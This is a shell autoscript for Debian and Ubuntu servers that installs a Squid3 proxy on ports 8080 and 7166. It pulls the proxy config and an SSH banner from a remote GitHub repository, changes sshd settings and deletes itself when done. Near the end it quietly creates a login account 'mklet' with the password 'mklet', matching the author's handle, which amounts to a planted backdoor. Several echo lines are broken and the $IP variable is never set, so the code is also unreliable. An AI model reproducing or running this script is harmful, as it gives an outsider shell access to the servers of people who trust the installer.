#!/bin/bash
#-----------------------------
#CREATE BY MKSSHVPN AUTOSCRIPT
#Version : DEBIAN 7.x, DEBIAN 8.x, UBUNTU 12.x ONLY !!
#LAST UPDATE : 31/1/2017
#TELEGRAM : @mk_let
#WHATSAPP : +60162771064
#----------------------------

#info
echo 
" INTSALL SQUID3/PROXY ONLY"
echo 
" AUTOSCRIPT START 1%"

#update
apt-get update
apt-get -y install wget
clear

echo 
" 27% COMPLETE "

#installing squid3
apt-get -y install squid3
rm -f /etc/squid3/squid.conf

#restoring squid config with open port proxy 8080,7166
wget -P /etc/squid3/ "https://raw.githubusercontent.com/zero9911/script/master/script/squid.conf"
sed -i "s/ipserver/$IP/g" /etc/squid3/squid.conf
service squid3 restart
cd

echo 
" 58% COMPLETE "

echo " ADD BANER MKSSHVPN"
#ssh
sed -i 's/#Banner/Banner/g' /etc/ssh/sshd_config
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
wget -O /etc/issue.net " https://raw.githubusercontent.com/zero9911/script/master/script/banner"
service ssh restart

echo " 91% COMPLETE "

#add user
useradd -m -g users -s /bin/bash mklet
echo "mklet:mklet" | chpasswd

echo "100% COMPLETE"
echo " BYE-BYE"

clear

echo "================================================="
echo "                                                "
echo "  === MKSSHVPN AUTOSCRIPT ===  "
echo "PROXY PORT : 7166,8080"
echo "edit "nano /etc/squid3/squid.conf" if want to allow other IP "
echo "CONTACT OWNER SCRIPT"
echo "WHATSAPP : +60162771064"
echo "TELEGRAM : @mk_let"
echo "For SWAP RAM PLEASE CONTACT OWNER"
echo "  === PLEASE REBOOT TAKE EFFECT  ===  "
echo "                                  "
echo "=================================================="
rm proxy.sh